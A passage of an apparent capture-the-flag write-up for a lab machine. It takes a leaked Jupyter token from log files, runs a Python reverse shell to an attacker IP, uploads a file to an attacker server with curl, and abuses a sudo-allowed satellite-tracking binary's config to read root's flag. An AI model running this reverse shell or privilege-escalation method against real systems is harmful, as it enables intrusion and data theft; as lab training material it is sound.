Here we have a webapp which prompt us for a token or password but we don't have anything. I have tried to create one but it doesn't work. Looking for files for the name notebook or jupyter we found the following

```bash
juno@jupiter:~$ find / -name *notebook* 2>/dev/null
[SNIP]
juno@jupiter:~$ find / -name *jupyter* 2>/dev/null
/opt/solar-flares/logs/jupyter-2023-05-04-20.log
/opt/solar-flares/logs/jupyter-2023-05-30-53.log
/opt/solar-flares/logs/jupyter-2023-05-04-31.log
/opt/solar-flares/logs/jupyter-2023-03-10-25.log
/opt/solar-flares/logs/jupyter-2023-04-13-43.log
/opt/solar-flares/logs/jupyter-2023-05-04-07.log
/opt/solar-flares/logs/jupyter-2023-03-10-42.log
/opt/solar-flares/logs/jupyter-2023-05-04-08.log
/opt/solar-flares/logs/jupyter-2023-05-04-06.log
/opt/solar-flares/logs/jupyter-2023-03-08-37.log
/opt/solar-flares/logs/jupyter-2023-03-08-38.log
/opt/solar-flares/logs/jupyter-2023-05-04-57.log
/opt/solar-flares/logs/jupyter-2023-08-28-19.log
/opt/solar-flares/logs/jupyter-2023-06-07-05.log
/opt/solar-flares/logs/jupyter-2023-04-14-27.log
/opt/solar-flares/logs/jupyter-2023-06-06-39.log
/opt/solar-flares/logs/jupyter-2023-05-04-43.log
/opt/solar-flares/logs/jupyter-2023-05-05-54.log
/opt/solar-flares/logs/jupyter-2023-05-04-02.log
/opt/solar-flares/logs/jupyter-2023-03-08-36.log
/opt/solar-flares/logs/jupyter-2023-05-04-45.log
/opt/solar-flares/logs/jupyter-2023-03-09-11.log
/opt/solar-flares/logs/jupyter-2023-05-04-04.log
/opt/solar-flares/logs/jupyter-2023-05-05-03.log
/opt/solar-flares/logs/jupyter-2023-03-09-24.log
/opt/solar-flares/logs/jupyter-2023-05-30-46.log
/opt/solar-flares/logs/jupyter-2023-03-08-14.log
/opt/solar-flares/logs/jupyter-2023-03-09-59.log
[SNIP]
```

So lets check the log files located in `/opt/solar-flares/logs` folder

```bash
juno@jupiter:~$ ls /opt/solar-flares/logs/
jupyter-2023-03-08-14.log  jupyter-2023-03-10-25.log  jupyter-2023-05-04-07.log  jupyter-2023-05-05-03.log  jupyter-2023-03-08-36.log  jupyter-2023-03-10-42.log  jupyter-2023-05-04-08.log  jupyter-2023-05-05-54.log  jupyter-2023-03-08-37.log  jupyter-2023-04-13-43.log  jupyter-2023-05-04-20.log  jupyter-2023-05-30-46.log  jupyter-2023-03-08-38.log  jupyter-2023-04-14-27.log  jupyter-2023-05-04-31.log  jupyter-2023-05-30-53.log  jupyter-2023-03-09-11.log  jupyter-2023-05-04-02.log  jupyter-2023-05-04-43.log  jupyter-2023-06-06-39.log  jupyter-2023-03-09-24.log  jupyter-2023-05-04-04.log  jupyter-2023-05-04-45.log  jupyter-2023-06-07-05.log
jupyter-2023-03-09-59.log  jupyter-2023-05-04-06.log  jupyter-2023-05-04-57.log  jupyter-2023-08-28-19.log
```

Lets try with the most recent

```bash
juno@jupiter:~$ cat /opt/solar-flares/logs/jupyter-2023-08-28-19.log
[SNIP]
http://localhost:8888/?token=db638ffcd64318435c2f0c0d042c02b495964bf20842e664
http://127.0.0.1:8888/?token=db638ffcd64318435c2f0c0d042c02b495964bf20842e664
 ```

And we are in

![[Pasted image 20230828195230.png]]

Now we can execute python code clicking `New > Python 3`. Execute a reverse shell code

```bash
import os,pty,socket;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")

--------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.216] 58020
$ whoami
jovian
```

And we have move laterally to the user jovian. Checking for sudoers we found the following

```bash
jovian@jupiter:/opt/solar-flares$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack

jovian@jupiter:/opt/solar-flares$ /usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
```

Lets find something the config file

```bash
vian@jupiter:/opt/solar-flares$ strings /usr/local/bin/sattrack | grep -i conf 
/tmp/config.json
Configuration file has not been found. Please try again!
tleroot not defined in config
updatePerdiod not defined in config
station not defined in config
name not defined in config
lat not defined in config
lon not defined in config
hgt not defined in config
mapfile not defined in config
texturefile not defined in config
tlefile not defined in config
su_lib_log_config
_GLOBAL__sub_I__Z6configB5cxx11
_Z14validateConfigv
```

We find that the app points to a  `config.json` file, lets find it

```bash
jovian@jupiter:/opt/solar-flares$ find / -name config.json 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
jovian@jupiter:/opt/solar-flares$ cat /usr/local/share/sattrack/config.json
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://celestrak.org/NORAD/elements/weather.txt",
                "http://celestrak.org/NORAD/elements/noaa.txt",
                "http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

So copy it to the folder where the app is looking

```bash
jovian@jupiter:/opt/solar-flares$ cp /usr/local/share/sattrack/config.json /tmp/config.json
```

Execute the app and watch what happen

```bash
jovian@jupiter:/opt/solar-flares$ /usr/local/bin/sattrack
Satellite Tracking System
Get:0 http://celestrak.org/NORAD/elements/weather.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/noaa.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
Could not resolve host: celestrak.org
Satellites loaded
No sats
```

It is downloading the resources that are specified in the json file, so lets modify the json file to retrieve the root.txt file. Copy the json file to the attacker machine and then move it to the tmp folder in the server

```bash
┌──(kali㉿kali)-[~/Documents/Resources/upl
└─$ sudo python3 -m uploadserver 443 --ser
[sudo] password for kali: 
File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https

-------------

jovian@jupiter:/opt/solar-flares$ curl -X POST https://10.10.14.12/upload -F 'files=@/usr/local/share/sattrack/config.json' --insecure
```

Here is how the modified config.json file looks

```bash
┌──(kali㉿kali)-[~/Documents/Resources/uploadServer/https]
└─$ cat config.json 
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:///root/root.txt"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}
```

Upload to the server and execute the app again with root privileges

```bash
jovian@jupiter:/tmp$ sudo /usr/local/bin/sattrack
Satellite Tracking System
Get:0 file:///root/root.txt
Satellites loaded
No sats
jovian@jupiter:/tmp$ find / -name root.txt 2>/dev/null
/tmp/tle/root.txt
jovian@jupiter:/tmp$ cat /tmp/tle/root.txt
a5f1a1bf880304ecd89b9c70cfe0b13f
```

And we have the root flag!